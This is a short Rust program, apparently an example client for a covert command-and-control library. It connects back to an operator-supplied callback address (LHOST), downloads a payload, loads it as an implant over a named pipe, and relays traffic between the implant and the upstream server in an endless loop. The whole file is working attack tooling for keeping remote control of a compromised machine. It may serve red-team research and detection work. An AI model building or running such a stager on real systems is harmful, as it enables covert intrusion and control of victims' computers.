use covert_client::{CSFrameRead, CSFrameWrite};
use std::net::TcpStream;

fn main() {
    let mut conn =
        TcpStream::connect(env!("LHOST", "Set LHOST for client callback")).unwrap();
    let payload = conn.read_frame().unwrap();
    let mut implant =
        covert_client::create_implant_from_buf(payload, "mypipe").unwrap();
    loop {
        let from_implant = implant.read_frame().unwrap();
        conn.write_frame(from_implant).unwrap();
        let from_upstream = conn.read_frame().unwrap();
        implant.write_frame(from_upstream).unwrap();
    }
}
